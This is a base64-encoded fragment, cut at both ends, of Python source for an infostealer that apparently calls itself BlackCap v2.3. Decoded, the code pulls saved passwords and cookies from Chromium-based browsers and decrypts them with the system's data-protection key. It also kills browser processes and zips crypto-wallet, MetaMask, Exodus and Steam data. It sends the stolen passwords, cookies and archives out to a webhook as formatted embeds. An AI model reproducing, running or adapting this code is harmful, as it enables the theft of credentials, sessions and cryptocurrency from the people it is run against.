YWRlcnMgIT0gIiI6CiAgICAgICAgICAgICAgICByID0gdXJsb3BlbihSZXF1ZXN0KGhvb2ssIGRhdGE9ZGF0YSwgaGVhZGVycz1oZWFkZXJzKSkKICAgICAgICAgICAgICAgIHJldHVybiByCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICByID0gdXJsb3BlbihSZXF1ZXN0KGhvb2ssIGRhdGE9ZGF0YSkpCiAgICAgICAgICAgICAgICByZXR1cm4gcgogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgcGFzcwoKCmRlZiBUcnVzdChDb29raWVzKToKICAgIGdsb2JhbCBERVRFQ1RFRAogICAgZGF0YSA9IHN0cihDb29raWVzKQogICAgdGltID0gcmUuZmluZGFsbCgiLmdvb2dsZS5jb20iLCBkYXRhKQogICAgaWYgbGVuKHRpbSkgPCAtMToKICAgICAgICBERVRFQ1RFRCA9IFRydWUKICAgICAgICByZXR1cm4gREVURUNURUQKICAgIGVsc2U6CiAgICAgICAgREVURUNURUQgPSBGYWxzZQogICAgICAgIHJldHVybiBERVRFQ1RFRAoKCmRlZiBSZWZvcm1hdChsaXN0dCk6CiAgICBlID0gcmUuZmluZGFsbCgiKFx3K1thLXpdKSIsIGxpc3R0KQogICAgd2hpbGUgImh0dHBzIiBpbiBlOgogICAgICAgIGUucmVtb3ZlKCJodHRwcyIpCiAgICB3aGlsZSAiY29tIiBpbiBlOgogICAgICAgIGUucmVtb3ZlKCJjb20iKQogICAgd2hpbGUgIm5ldCIgaW4gZToKICAgICAgICBlLnJlbW92ZSgibmV0IikKICAgIHJldHVybiBsaXN0KHNldChlKSkKCgpkZWYgdXBsb2FkKG5hbWUsIHRrPSIiKToKICAgIGhlYWRlcnMgPSB7CiAgICAgICAgIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIiwKICAgICAgICAiVXNlci1BZ2VudCI6ICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBydjoxMDIuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDIuMCIsCiAgICB9CgogICAgaWYgbmFtZSA9PSAiY2hlY2tfc3BlY19iYyI6CiAgICAgICAgZGF0YSA9IHsKICAgICAgICAgICAgImNvbnRlbnQiOiAiIiwKICAgICAgICAgICAgImVtYmVkcyI6IFsKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAiZmllbGRzIjogWwogICAgICAgICAgICAgICAgICAgICAgICB7Im5hbWUiOiAiSW50ZXJlc3RpbmcgZmlsZXMgZm91bmQgb24gdXNlciBQQzoiLCAidmFsdWUiOiB0a30KICAgICAgICAgICAgICAgICAgICBdLAogICAgICAgICAgICAgICAgICAgICJhdXRob3IiOiB7CiAgICAgICAgICAgICAgICAgICAgICAgICJuYW1lIjogZiJCbGFjayAtIENhcCB2Mi4zIiwKICAgICAgICAgICAgICAgICAgICAgICAgInVybCI6ICJodHRwczovL2dpdGh1Yi5jb20vS1NDSGRzYyIsCiAgICAgICAgICAgICAgICAgICAgICAgICJpY29uX3VybCI6ICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vS1NDSGRzYy9EZXN0cnVDb3JkLUluamVjdC9tYWluL2JsYWNrY2FwLmdpZiIsCiAgICAgICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgICAgICAiZm9vdGVyIjogeyJ0ZXh0IjogImdpdGh1Yi5jb20vS1NDSGRzYyJ9LAogICAgICAgICAgICAgICAgICAgICJjb2xvciI6IDM3NDI3NiwKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgXSwKICAgICAgICAgICAgImF2YXRhcl91cmwiOiAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0tTQ0hkc2MvQmxhY2tDYXAtQXNzZXRzL21haW4vYmxhY2tjYXAlMjAoMikucG5nIiwKICAgICAgICAgICAgImF0dGFjaG1lbnRzIjogW10sCiAgICAgICAgfQogICAgICAgIFVSTF9saWJyYWlyeV9Mb2FkaW5nKGhvb2ssIGRhdGE9ZHVtcHMoZGF0YSkuZW5jb2RlKCksIGhlYWRlcnM9aGVhZGVycykKICAgICAgICByZXR1cm4KICAgIHBhdGggPSBuYW1lCiAgICBmaWxlcyA9IHsiZmlsZSI6IG9wZW4ocGF0aCwgInJiIil9CgogICAgaWYgImJjX2FsbHBhc3N3b3JkcyIgaW4gbmFtZToKICAgICAgICByYSA9ICIgfCAiLmpvaW4oZGEgZm9yIGRhIGluIHBhc3dXb3JkcykKCiAgICAgICAgaWYgbGVuKHJhKSA+IDEwMDA6CiAgICAgICAgICAgIHJyciA9IFJlZm9ybWF0KHN0cihwYXN3V29yZHMpKQogICAgICAgICAgICByYSA9ICIgfCAiLmpvaW4oZGEgZm9yIGRhIGluIHJycikKICAgICAgICBkYXRhID0gewogICAgICAgICAgICAiY29udGVudCI6ICIiLAogICAgICAgICAgICAiZW1iZWRzIjogWwogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICJmaWVsZHMiOiBbeyJuYW1lIjogIlBhc3N3b3JkcyBGb3VuZDoiLCAidmFsdWUiOiByYX1dLAogICAgICAgICAgICAgICAgICAgICJhdXRob3IiOiB7CiAgICAgICAgICAgICAgICAgICAgICAgICJuYW1lIjogZiJCbGFjayAtIENhcCB2Mi4zIiwKICAgICAgICAgICAgICAgICAgICAgICAgInVybCI6ICJodHRwczovL2dpdGh1Yi5jb20vS1NDSGRzYyIsCiAgICAgICAgICAgICAgICAgICAgICAgICJpY29uX3VybCI6ICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vS1NDSGRzYy9EZXN0cnVDb3JkLUluamVjdC9tYWluL2JsYWNrY2FwLmdpZiIsCiAgICAgICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgICAgICAiZm9vdGVyIjogewogICAgICAgICAgICAgICAgICAgICAgICAidGV4dCI6ICJnaXRodWIuY29tL0tTQ0hkc2MiLAogICAgICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICAgICAgImNvbG9yIjogMzc0Mjc2LAogICAgICAgICAgICAgICAgfQogICAgICAgICAgICBdLAogICAgICAgICAgICAiYXZhdGFyX3VybCI6ICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vS1NDSGRzYy9CbGFja0NhcC1Bc3NldHMvbWFpbi9ibGFja2NhcCUyMCgyKS5wbmciLAogICAgICAgICAgICAiYXR0YWNobWVudHMiOiBbXSwKICAgICAgICB9CiAgICAgICAgVVJMX2xpYnJhaXJ5X0xvYWRpbmcoaG9vaywgZGF0YT1kdW1wcyhkYXRhKS5lbmNvZGUoKSwgaGVhZGVycz1oZWFkZXJzKQogICAgaWYgImJjX2FsbGNvb2tpZXMiIGluIG5hbWU6CiAgICAgICAgcmIgPSAiIHwgIi5qb2luKGRhIGZvciBkYSBpbiBjb29raVdvcmRzKQogICAgICAgIGlmIGxlbihyYikgPiAxMDAwOgogICAgICAgICAgICBycnJyciA9IFJlZm9ybWF0KHN0cihjb29raVdvcmRzKSkKICAgICAgICAgICAgcmIgPSAiIHwgIi5qb2luKGRhIGZvciBkYSBpbiBycnJycikKICAgICAgICBkYXRhID0gewogICAgICAgICAgICAiY29udGVudCI6ICIiLAogICAgICAgICAgICAiZW1iZWRzIjogWwogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICJmaWVsZHMiOiBbeyJuYW1lIjogIkNvb2tpZXMgRm91bmQ6IiwgInZhbHVlIjogcmJ9XSwKICAgICAgICAgICAgICAgICAgICAiYXV0aG9yIjogewogICAgICAgICAgICAgICAgICAgICAgICAibmFtZSI6IGYiQmxhY2sgLSBDYXAgdjIuMyIsCiAgICAgICAgICAgICAgICAgICAgICAgICJ1cmwiOiAiaHR0cHM6Ly9naXRodWIuY29tL0tTQ0hkc2MiLAogICAgICAgICAgICAgICAgICAgICAgICAiaWNvbl91cmwiOiAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0tTQ0hkc2MvRGVzdHJ1Q29yZC1JbmplY3QvbWFpbi9ibGFja2NhcC5naWYiLAogICAgICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICAgICAgImZvb3RlciI6IHsKICAgICAgICAgICAgICAgICAgICAgICAgInRleHQiOiAiZ2l0aHViLmNvbS9LU0NIZHNjIiwKICAgICAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgICAgICJjb2xvciI6IDM3NDI3NiwKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgXSwKICAgICAgICAgICAgImF2YXRhcl91cmwiOiAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0tTQ0hkc2MvQmxhY2tDYXAtQXNzZXRzL21haW4vYmxhY2tjYXAlMjAoMikucG5nIiwKICAgICAgICAgICAgImF0dGFjaG1lbnRzIjogW10sCiAgICAgICAgfQogICAgICAgIFVSTF9saWJyYWlyeV9Mb2FkaW5nKGhvb2ssIGRhdGE9ZHVtcHMoZGF0YSkuZW5jb2RlKCksIGhlYWRlcnM9aGVhZGVycykKICAgIFJlcXVlc3RzX2xvYWRpbmcoIlBPU1QiLCBob29rLCBmaWxlcz1maWxlcykKCgpkZWYgd3JpdGVmb3JmaWxlKGRhdGEsIG5hbWUpOgogICAgcGF0aCA9IG9zLmdldGVudigiVEVNUCIpICsgZiJce25hbWV9LnR4dCIKICAgIHdpdGggb3BlbihwYXRoLCBtb2RlPSJ3IiwgZW5jb2Rpbmc9InV0Zi04IikgYXMgZjoKICAgICAgICBmLndyaXRlKGYiQ3JlYXRlZCBieSBLU0NIIHwgaHR0cHM6Ly9naXRodWIuY29tL0tTQ0hkc2NcblxuIikKICAgICAgICBmb3IgbGluZSBpbiBkYXRhOgogICAgICAgICAgICBpZiBsaW5lWzBdICE9ICIiOgogICAgICAgICAgICAgICAgZi53cml0ZShmIntsaW5lfVxuIikKCgpOb3RQU1NXID0gW10KCgpkZWYgRmluZF9QYXNzdyhwYXRoLCBhcmcpOgogICAgZ2xvYmFsIE5vdFBTU1cKICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhwYXRoKToKICAgICAgICByZXR1cm4KICAgIHBhdGhDID0gcGF0aCArIGFyZyArICIvTG9naW4gRGF0YSIKICAgIGlmIG9zLnN0YXQocGF0aEMpLnN0X3NpemUgPT0gMDoKICAgICAgICByZXR1cm4KICAgIHRlbXBmb2xkID0gKAogICAgICAgIHRlbXAKICAgICAgICArICJiY19pc19oZXJlIgogICAgICAgICsgIiIuam9pbihyYW5kb20uY2hvaWNlKCJiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6IikgZm9yIGkgaW4gcmFuZ2UoOCkpCiAgICAgICAgKyAiLmRiIgogICAgKQogICAgc2h1dGlsLmNvcHkyKHBhdGhDLCB0ZW1wZm9sZCkKICAgIGNvbm4gPSBjb25uZWN0KHRlbXBmb2xkKQogICAgY3Vyc29yID0gY29ubi5jdXJzb3IoKQogICAgY3Vyc29yLmV4ZWN1dGUoIlNFTEVDVCBhY3Rpb25fdXJsLCB1c2VybmFtZV92YWx1ZSwgcGFzc3dvcmRfdmFsdWUgRlJPTSBsb2dpbnM7IikKICAgIGRhdGEgPSBjdXJzb3IuZmV0Y2hhbGwoKQogICAgY3Vyc29yLmNsb3NlKCkKICAgIGNvbm4uY2xvc2UoKQogICAgb3MucmVtb3ZlKHRlbXBmb2xkKQoKICAgIHBhdGhLZXkgPSBwYXRoICsgIi9Mb2NhbCBTdGF0ZSIKICAgIHdpdGggb3BlbihwYXRoS2V5LCAiciIsIGVuY29kaW5nPSJ1dGYtOCIpIGFzIGY6CiAgICAgICAgbG9jYWxfc3RhdGUgPSBsb2FkcyhmLnJlYWQoKSkKICAgIG1hc3Rlcl9rZXkgPSBiNjRkZWNvZGUobG9jYWxfc3RhdGVbIm9zX2NyeXB0Il1bImVuY3J5cHRlZF9rZXkiXSkKICAgIG1hc3Rlcl9rZXkgPSBDcnlwdFVucHJvdGVjdERhdGEobWFzdGVyX2tleVs1Ol0pCgogICAgZm9yIHJvdyBpbiBkYXRhOgogICAgICAgIGlmIHJvd1swXSAhPSAiIjoKICAgICAgICAgICAgZm9yIHdhIGluIGtleXdvcmQ6CiAgICAgICAgICAgICAgICBvbGQgPSB3YQogICAgICAgICAgICAgICAgaWYgImh0dHBzIiBpbiB3YToKICAgICAgICAgICAgICAgICAgICB0bXAgPSB3YQogICAgICAgICAgICAgICAgICAgIHdhID0gdG1wLnNwbGl0KCJbIilbMV0uc3BsaXQoIl0iKVswXQogICAgICAgICAgICAgICAgaWYgd2EgaW4gcm93WzBdOgogICAgICAgICAgICAgICAgICAgIGlmIG5vdCBvbGQgaW4gcGFzd1dvcmRzOgogICAgICAgICAgICAgICAgICAgICAgICBwYXN3V29yZHMuYXBwZW5kKG9sZCkKICAgICAgICAgICAgTm90UFNTVy5hcHBlbmQoCiAgICAgICAgICAgICAgICBmIlVSTDoge3Jvd1swXX0gXG4gSUQ6IHtyb3dbMV19IFxuIFBBU1NXMFJEOiB7VmFsdWVfRGNyeXB0YWdlKHJvd1syXSwgbWFzdGVyX2tleSl9XG5cbiIKICAgICAgICAgICAgKQogICAgd3JpdGVmb3JmaWxlKE5vdFBTU1csICJiY19hbGxwYXNzd29yZHMiKQoKCkNvb2tpZXMgPSBbXQoKCmRlZiBHZXRfQmNfQ29vayhwYXRoLCBhcmcpOgogICAgZ2xvYmFsIENvb2tpZXMKICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhwYXRoKToKICAgICAgICByZXR1cm4KICAgIHBhdGhDID0gcGF0aCArIGFyZyArICIvQ29va2llcyIKICAgIGlmIG9zLnN0YXQocGF0aEMpLnN0X3NpemUgPT0gMDoKICAgICAgICByZXR1cm4KICAgIHRlbXBmb2xkID0gKAogICAgICAgIHRlbXAKICAgICAgICArICJiY19pc19oZXJlIgogICAgICAgICsgIiIuam9pbihyYW5kb20uY2hvaWNlKCJiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6IikgZm9yIGkgaW4gcmFuZ2UoOCkpCiAgICAgICAgKyAiLmRiIgogICAgKQoKICAgIHNodXRpbC5jb3B5MihwYXRoQywgdGVtcGZvbGQpCiAgICBjb25uID0gY29ubmVjdCh0ZW1wZm9sZCkKICAgIGN1cnNvciA9IGNvbm4uY3Vyc29yKCkKICAgIGN1cnNvci5leGVjdXRlKCJTRUxFQ1QgaG9zdF9rZXksIG5hbWUsIGVuY3J5cHRlZF92YWx1ZSBGUk9NIGNvb2tpZXMiKQogICAgZGF0YSA9IGN1cnNvci5mZXRjaGFsbCgpCiAgICBjdXJzb3IuY2xvc2UoKQogICAgY29ubi5jbG9zZSgpCiAgICBvcy5yZW1vdmUodGVtcGZvbGQpCgogICAgcGF0aEtleSA9IHBhdGggKyAiL0xvY2FsIFN0YXRlIgoKICAgIHdpdGggb3BlbihwYXRoS2V5LCAiciIsIGVuY29kaW5nPSJ1dGYtOCIpIGFzIGY6CiAgICAgICAgbG9jYWxfc3RhdGUgPSBsb2FkcyhmLnJlYWQoKSkKICAgIG1hc3Rlcl9rZXkgPSBiNjRkZWNvZGUobG9jYWxfc3RhdGVbIm9zX2NyeXB0Il1bImVuY3J5cHRlZF9rZXkiXSkKICAgIG1hc3Rlcl9rZXkgPSBDcnlwdFVucHJvdGVjdERhdGEobWFzdGVyX2tleVs1Ol0pCgogICAgZm9yIHJvdyBpbiBkYXRhOgogICAgICAgIGlmIHJvd1swXSAhPSAiIjoKICAgICAgICAgICAgZm9yIHdhIGluIGtleXdvcmQ6CiAgICAgICAgICAgICAgICBvbGQgPSB3YQogICAgICAgICAgICAgICAgaWYgImh0dHBzIiBpbiB3YToKICAgICAgICAgICAgICAgICAgICB0bXAgPSB3YQogICAgICAgICAgICAgICAgICAgIHdhID0gdG1wLnNwbGl0KCJbIilbMV0uc3BsaXQoIl0iKVswXQogICAgICAgICAgICAgICAgaWYgd2EgaW4gcm93WzBdOgogICAgICAgICAgICAgICAgICAgIGlmIG5vdCBvbGQgaW4gY29va2lXb3JkczoKICAgICAgICAgICAgICAgICAgICAgICAgY29va2lXb3Jkcy5hcHBlbmQob2xkKQogICAgICAgICAgICBDb29raWVzLmFwcGVuZCgKICAgICAgICAgICAgICAgIGYie3Jvd1swXX0JVFJVRSIKICAgICAgICAgICAgICAgICsgIgkJIgogICAgICAgICAgICAgICAgKyBmIi9GQUxTRQkyNTk3NTczNDU2CXtyb3dbMV19CXtWYWx1ZV9EY3J5cHRhZ2Uocm93WzJdLCBtYXN0ZXJfa2V5KX0iCiAgICAgICAgICAgICkKICAgIHdyaXRlZm9yZmlsZShDb29raWVzLCAiYmNfYWxsY29va2llcyIpCgoKZGVmIGNoZWNrSWZQcm9jZXNzUnVubmluZyhwcm9jZXNzTmFtZSk6CiAgICAiIiIKICAgIENoZWNrIGlmIHRoZXJlIGlzIGFueSBydW5uaW5nIHByb2Nlc3MgdGhhdCBjb250YWlucyB0aGUgZ2l2ZW4gbmFtZSBwcm9jZXNzTmFtZS4KICAgICIiIgogICAgIyBJdGVyYXRlIG92ZXIgdGhlIGFsbCB0aGUgcnVubmluZyBwcm9jZXNzCiAgICBmb3IgcHJvYyBpbiBwc3V0aWwucHJvY2Vzc19pdGVyKCk6CiAgICAgICAgdHJ5OgogICAgICAgICAgICAjIENoZWNrIGlmIHByb2Nlc3MgbmFtZSBjb250YWlucyB0aGUgZ2l2ZW4gbmFtZSBzdHJpbmcuCiAgICAgICAgICAgIGlmIHByb2Nlc3NOYW1lLmxvd2VyKCkgaW4gcHJvYy5uYW1lKCkubG93ZXIoKToKICAgICAgICAgICAgICAgIHJldHVybiBUcnVlCiAgICAgICAgZXhjZXB0IChwc3V0aWwuTm9TdWNoUHJvY2VzcywgcHN1dGlsLkFjY2Vzc0RlbmllZCwgcHN1dGlsLlpvbWJpZVByb2Nlc3MpOgogICAgICAgICAgICBwYXNzCiAgICByZXR1cm4gRmFsc2UKCgpkZWYgWmlwTXlUaGluZ3MocGF0aCwgYXJnLCBwcm9jYyk6CiAgICBwYXRoQyA9IHBhdGgKICAgIG5hbWUgPSBhcmcKICAgIGlmICJhaG9scGZkaWFsamdqZmhvbWloa2pibWdqaWRsY2RubyIgaW4gYXJnOgogICAgICAgIGJyb3dzZXIgPSBwYXRoLnNwbGl0KCJcXCIpWzRdLnNwbGl0KCIvIilbMV0ucmVwbGFjZSgiICIsICIiKQogICAgICAgIG5hbWUgPSBmIkV4b2R1c197YnJvd3Nlcn0iCiAgICAgICAgcGF0aEMgPSBwYXRoICsgYXJnCiAgICBpZiAibmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4iIGluIGFyZzoKICAgICAgICBicm93c2VyID0gcGF0aC5zcGxpdCgiXFwiKVs0XS5zcGxpdCgiLyIpWzFdLnJlcGxhY2UoIiAiLCAiIikKICAgICAgICBuYW1lID0gZiJNZXRhbWFza197YnJvd3Nlcn0iCiAgICAgICAgcGF0aEMgPSBwYXRoICsgYXJnCiAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMocGF0aEMpOgogICAgICAgIHJldHVybgogICAgaWYgY2hlY2tJZlByb2Nlc3NSdW5uaW5nKCJjaHJvbWUuZXhlIik6CiAgICAgICAgcHJpbnQoIlllcyBhIGNocm9tZSBwcm9jZXNzIHdhcyBydW5uaW5nIikKICAgICAgICBzdWJwcm9jZXNzLlBvcGVuKGYidGFza2tpbGwgL2ltIHtwcm9jY30gL3QgL2YiLCBzaGVsbD1UcnVlKQogICAgZWxzZToKICAgICAgICAuLi4KICAgIGlmICJXYWxsZXQiIGluIGFyZyBvciAiTmF0aW9uc0dsb3J5IiBpbiBhcmc6CiAgICAgICAgYnJvd3NlciA9IHBhdGguc3BsaXQoIlxcIilbNF0uc3BsaXQoIi8iKVsxXS5yZXBsYWNlKCIgIiwgIiIpCiAgICAgICAgbmFtZSA9IGYie2Jyb3dzZXJ9IgogICAgZWxpZiAiU3RlYW0iIGluIGFyZzoKICAgICAgICBpZiBub3Qgb3MucGF0aC5pc2ZpbGUoZiJ7cGF0aEN9L2xvZ2ludXNlcnMudmRmIik6CiAgICAgICAgICAgIHJldHVybgogICAgICAgIGYgPSBvcGVuKGYie3BhdGhDfS9sb2dpbnVzZXJzLnZkZiIsICJyKyIsIGVuY29kaW5nPSJ1dGY4IikKICAgICAgICBkYXRhID0gZi5yZWFkbGluZXMoKQogICAgICAgIGZvdW5kID0gRmFsc2UKICAgICAgICBmb3IgbCBpbiBkYXRhOgogICAgICAgICAgICBpZiAnUmVtZW1iZXJQYXNzd29yZCJcdFx0IjEiJyBpbiBsOgogICAgICAgICAgICAgICAgZm91bmQgPSBUcnVlCiAgICAgICAgaWYgZm91bmQgPT0gRmFsc2U6CiAgICAgICAgICAgIHJldHVybgogICAgICAgIG5hbWUgPSBhcmcKICAgIHpmID0gemlwZmlsZS5aaXBGaWxlKGYie3BhdGhDfS97bmFtZX0uemlwIiwgInciKQogICAgcHJpbnQoemYpCiAgICBmb3IgZmlsZSBpbiBvcy5saXN0ZGlyKHBhdGhDKToKICAgICAgICBpZiBub3QgIi56aXAiIGluIGZpbGU6CiAgICAgICAgICAgIHpmLndyaXRlKHBhdGhDICsgIi8iICsgZmlsZSkKICAgIHpmLmNsb3NlKCkKCiAgICB1cGxvYWQoZiJ7cGF0aEN9L3tuYW1lfS56aXAiKQogICAgb3MucmVtb3ZlKGYie3BhdGhDfS97bmFtZX0uemlwIikKCgpkZWYgYmNfR2F0aGVyX0FsbCgpOgogICAgIkRlZmF1bHQgUGF0aCA8IDAgPiAgICAgICAgICAgICAgICAgICAgICAgICBQcm9jZXNOYW1lIDwgMSA+ICAgICAgICBUb2tlbiAgPCAyID4gICAgICAgICAgICAgIFBhc3N3b3JkIDwgMyA+ICAgICBDb29raWVzIDwgNCA+ICAgICAgICAgICAgICAgICAgICAgICAgICBFeHRlbnRpb25zIDwgNSA+IgogICAgYnJvd3NlclBhdGhzID0gWwogICAgICAgIFsKICAgICAgICAgICAgZiJ7cm9hbWluZ30vT3BlcmEgU29mdHdhcmUvT3BlcmEgR1ggU3RhYmxlIiwKICAgICAgICAgICAgIm9wZXJhLmV4ZSIsCiAgICAgICAgICAgICIvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIiwKICAgICAgICAgICAgIi8iLAogICAgICAgICAgICAiL05ldHdvcmsiLAogICAgICAgICAgICAiL0xvY2FsIEV4dGVuc2lvbiBTZXR0aW5ncy9ua2JpaGZiZW9nYWVhb2VobGVmbmtvZGJlZmdwZ2tubiIsCiAgICAgICAgXSwKICAgICAgICBbCiAgICAgICAgICAgIGYie3JvYW1pbmd9L09wZXJhIFNvZnR3YXJlL09wZXJhIFN0YWJsZSIsCiAgICAgICAgICAgICJvcGVyYS5leGUiLAogICAgICAgICAgICAiL0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsCiAgICAgICAgICAgICIvIiwKICAgICAgICAgICAgIi9OZXR3b3JrIiwKICAgICAgICAgICAgIi9Mb2NhbCBFeHRlbnNpb24gU2V0dGluZ3MvbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4iLAogICAgICAgIF0sCiAgICAgICAgWwogICAgICAgICAgICBmIntyb2FtaW5nfS9PcGVyYSBTb2Z0d2FyZS9PcGVyYSBOZW9uL1VzZXIgRGF0YS9EZWZhdWx0IiwKICAgICAgICAgICAgIm9wZXJhLmV4ZSIsCiAgICAgICAgICAgICIvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIiwKICAgICAgICAgICAgIi8iLAogICAgICAgICAgICAiL05ldHdvcmsiLAogICAgICAgICAgICAiL0xvY2FsIEV4dGVuc2lvbiBTZXR0aW5ncy9ua2JpaGZiZW9nYWVhb2VobGVmbmtvZGJlZmdwZ2tubiIsCiAgICAgICAgXSwKICAgICAgICBbCiAgICAgICAgICAgIGYie2xvY2FsfS9Hb29nbGUvQ2hyb21lL1VzZXIgRGF0YSIsCiAgICAgICAgICAgICJjaHJvbWUuZXhlIiwKICAgICAgICAgICAgIi9EZWZhdWx0L0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsCiAgICAgICAgICAgICIvRGVmYXVsdCIsCiAgICAgICAgICAgICIvRGVmYXVsdC9OZXR3b3JrIiwKICAgICAgICAgICAgIi9EZWZhdWx0L0xvY2FsIEV4dGVuc2lvbiBTZXR0aW5ncy9ua2JpaGZiZW9nYWVhb2VobGVmbmtvZGJlZmdwZ2tubiIsCiAgICAgICAgXSwKICAgICAgICBbCiAgICAgICAgICAgIGYie2xvY2FsfS9Hb29nbGUvQ2hyb21lIFN4Uy9Vc2VyIERhdGEiLAogICAgICAgICAgICAiY2hyb21lLmV4ZSIsCiAgICAgICAgICAgICIvRGVmYXVsdC9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiLAogICAgICAgICAgICAiL0RlZmF1bHQiLAogICAgICAgICAgICAiL0RlZmF1bHQvTmV0d29yayIsCiAgICAgICAgICAgICIvRGVmYXVsdC9Mb2NhbCBFeHRlbnNpb24gU2V0dGluZ3MvbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4iLAogICAgICAgIF0sCiAgICAgICAgWwogICAgICAgICAgICBmIntsb2NhbH0vQnJhdmVTb2Z0d2FyZS9CcmF2ZS1Ccm93c2VyL1VzZXIgRGF0YSIsCiAgICAgICAgICAgICJicmF2ZS5leGUiLAogICAgICAgICAgICAiL0RlZmF1bHQvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIiwKICAgICAgICAgICAgIi9EZWZhdWx0IiwKICAgICAgICAgICAgIi9EZWZhdWx0L05ldHdvcmsiLAogICAgICAgICAgICAiL0RlZmF1bHQvTG9jYWwgRXh0ZW5zaW9uIFNldHRpbmdzL25rYmloZmJlb2dhZWFvZWhsZWZua29kYmVmZ3Bna25uIiwKICAgICAgICBdLAogICAgICAgIFsKICAgICAgICAgICAgZiJ7bG9jYWx9L1lhbmRleC9ZYW5kZXhCcm93c2VyL1VzZXIgRGF0YSIsCiAgICAgICAgICAgICJ5YW5kZXguZXhlIiwKICAgICAgICAgICAgIi9EZWZhdWx0L0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsCiAgICAgICAgICAgICIvRGVmYXVsdCIsCiAgICAgICAgICAgICIvRGVmYXVsdC9OZXR3b3JrIiwKICAgICAgICAgICAgIi9Ib3VnYUJvdWdhL25rYmloZmJlb2dhZWFvZWhsZWZua29kYmVmZ3Bna25uIiwKICAgICAgICBdLAogICAgICAgIFsKICAgICAgICAgICAgZiJ7bG9jYWx9L01pY3Jvc29mdC9FZGdlL1VzZXIgRGF0YSIsCiAgICAgICAgICAgICJlZGdlLmV4ZSIsCiAgICAgICAgICAgICIvRGVmYXVsdC9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiLAogICAgICAgICAgICAiL0RlZmF1bHQiLAogICAgICAgICAgICAiL0RlZmF1bHQvTmV0d29yayIsCiAgICAgICAgICAgICIvRGVmYXVsdC9Mb2NhbCBFeHRlbnNpb24gU2V0dGluZ3MvbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4iLAogICAgICAgIF0sCiAgICBdCgogICAgUGF0aHNfemlwcGVkID0gWwogICAgICAgIFtmIntyb2FtaW5nfS9hdG9taWMvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIiwgJyJBdG9taWMgV2FsbGV0LmV4ZSInLCAiV2FsbGV0Il0sCiAgICAgICAgW2Yie3JvYW1pbmd9L0V4b2R1cy9leG9kdXMud2FsbGV0IiwgIkV4b2R1cy5leGUiLCAiV2FsbGV0Il0sCiAgICAgICAgWyJDOlxQcm9ncmFtIEZpbGVzICh4ODYpXFN0ZWFtXGNvbmZpZyIsICJzdGVhbS5leGUiLCAiU3RlYW0iXSwKICAgICAgICBbCiAgICAgICAgICAgIGYie3JvYW1pbmd9L05hdGlvbnNHbG9yeS9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiLAogICAgICAgICAgICAiTmF0aW9uc0dsb3J5LmV4ZSIsCiAgICAgICAgICAgICJOYXRpb25zR2xvcnkiLAogICAgICAgIF0sCiAgICBdCgogICAgZm9yIHBhdHQgaW4gYnJvd3NlclBhdGhzOgogICAgICAgIGEgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1GaW5kX1Bhc3N3LCBhcmdzPVtwYXR0WzBdLCBwYXR0WzNdXSkKICAgICAgICBhLnN0YXJ0KCkKICAgICAgICBUaHJlYWRsaXN0LmFwcGVuZChhKQogICAgdGhyZWFkX2JjY29va2llcyA9IFtdCiAgICBmb3IgcGF0dCBpbiBicm93c2VyUGF0aHM6CiAgICAgICAgYSA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PUdldF9CY19Db29rLCBhcmdzPVtwYXR0WzBdLCBwYXR0WzRdXSkKICAgICAgICBhLnN0YXJ0KCkKICAgICAgICB0aHJlYWRfYmNjb29raWVzLmFwcGVuZChhKQogICAgZm9yIHRocmVhZCBpbiB0aHJlYWRfYmNjb29raWVzOgogICAgICAgIHRocmVhZC5qb2luKCkKICAgIERFVEVDVEVEID0gVHJ1c3QoQ29va2llcykKICAgIGlmIERFVEVDVEVEID09IFRydWU6CiAgICAgICAgcmV0dXJuCiAgICBmb3IgcGF0dCBpbiBicm93c2VyUGF0aHM6CiAgICAgICAgdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9WmlwTXlUaGluZ3MsIGFyZ3M9W3BhdHRbMF0sIHBhdHRbNV0sIH